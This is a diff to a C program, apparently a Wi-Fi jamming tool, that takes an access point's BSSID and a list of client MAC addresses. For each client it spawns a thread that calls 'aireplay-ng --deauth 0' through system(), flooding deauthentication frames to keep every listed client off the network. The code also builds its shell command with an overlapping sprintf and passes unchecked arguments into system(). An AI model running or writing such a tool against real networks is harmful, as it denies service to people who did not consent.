@@ -13,7 +13,7 @@
 
   License     [GPLv2, see LICENSE.md]
   
-  Revision    [beta-04, 2013-12-15]
+  Revision    [beta-04, 2013-12-17]
 
 ******************************************************************************/
 
@@ -28,31 +28,33 @@
 #include <unistd.h>
 #include <errno.h>
 #include <pthread.h>
+#include <signal.h>
 
 //Library functions header
 #include "lib.h"
 
 //Prototypes
-void *jammer();
+static void *jammer();
+static void sigHandler(int);
 
 //error variable
 //xextern int errno;
 
-struct deainfo {
-	maclist_t *maclst;
-	char *bssid;
-	char *mon;
-};
-
-struct deainfo *deathread;
+//General variables
+static char *bssid;
+static char *mon;
+static maclist_t *maclst;
 
 
 int main (int argc, char *argv[])
 {
-	int i, dim, ris, *idx;
-	maclist_t *maclst;
+	int i, dim, ris;
 	pthread_t tid;
 
+	//set signal handler for SIGINT (Ctrl-C)
+	signal(SIGINT, sigHandler);
+
+	//syntax
 	if (argc < 4) {
 		fprintf(stderr, "Argument error. Syntax:\n\t%s [BSSID] [MONITOR-IF] [MAC-LIST-FILE]\n", argv[0]);
 		return (EXIT_FAILURE);
@@ -62,6 +64,12 @@ int main (int argc, char *argv[])
         fprintf(stderr, "Run it as root!\n");
 		return (EXIT_FAILURE);
     }
+	//check BSSID
+	if (checkMac(argv[1]) == FALSE) {
+		fprintf(stderr, "Error: wrong format for BSSID (%s).\n", argv[1]);
+		return (EXIT_FAILURE);
+	}
+
 	dim = 0;
 	//reading MACs list
 	if ((maclst = freadMaclist(argv[3])) == NULL)
@@ -71,23 +79,15 @@ int main (int argc, char *argv[])
 		freeMem(maclst);
 		return (EXIT_FAILURE);
 	}
-	//make data struct
-	if ((deathread = (struct deainfo *)malloc(sizeof(struct deainfo))) == NULL) {
-		fprintf(stderr, "\nError allocating struct: %s\n", strerror(errno));
-		return (EXIT_FAILURE);
-	}
-	deathread->maclst = maclst;
-	deathread->bssid = argv[1];
-	deathread->mon = argv[2];
-	if ((idx = (int *)malloc(dim * sizeof(int))) == NULL) {
-		fprintf(stderr, "\nError allocating index: %s\n", strerror(errno));
-		return (EXIT_FAILURE);
-	}
+	//setting up variables
+	bssid = argv[1];
+	mon = argv[2];
+	setbuf(stdout, NULL);
 
 	//creation of threads
+	fprintf(stdout, "\tStarting %d deauths:\n", dim);
 	for (i=0; i<dim; i++) {
-		idx[i] = i;
-		ris = pthread_create(&tid, NULL, jammer, (void *) &idx[i]);
+		ris = pthread_create(&tid, NULL, jammer, (void *) getMac(maclst, i));
 		if (ris) {
 			fprintf(stderr, "Error creating thread %d (%d): %s\n", i, ris, strerror(errno));
 			return (EXIT_FAILURE);
@@ -95,28 +95,34 @@ int main (int argc, char *argv[])
 	}
 	pause();
 
-    freeMem(maclst);
-	free(deathread);
-	free(idx);
-
-	//return (EXIT_SUCCESS);
 	pthread_exit(NULL);
 }
 
 
-void *jammer(void *idx)
+/* Thread target function */
+static void *jammer(void *mac)
 {
-	int i;
-	char death[]={"aireplay-ng --deauth 0 -a"}, cmd[BUFF];
+	char *addr;
+	char death[BUFF]={"aireplay-ng --deauth 0 -a"};
 
-	i = *(int *)idx;
-
-	sprintf(cmd, "%s %s -c %s %s --ignore-negative-one", death, deathread->bssid, getMac(deathread->maclst, i), deathread->mon);
-	fprintf(stdout, "\tDeAuth n.%d:\n", i+1);
-	setbuf(stdout, NULL);
-
-	system(cmd);
+	addr = (char *)mac;
+	sprintf(death, "%s %s -c %s %s --ignore-negative-one", death, bssid, addr, mon);
+	system(death);
 
 	pthread_exit(NULL);
+}
+
+
+/* Signal handler */
+static void sigHandler(int sig)
+{
+	if (sig == SIGINT)
+		fprintf(stderr, "\tReceived signal SIGINT (%d): exiting.\n", sig);
+	else
+		fprintf(stderr, "\tReceived signal %d: exiting.\n", sig);
+
+	//free and exit
+	freeMem(maclst);
+	exit(EXIT_FAILURE);
 }
 
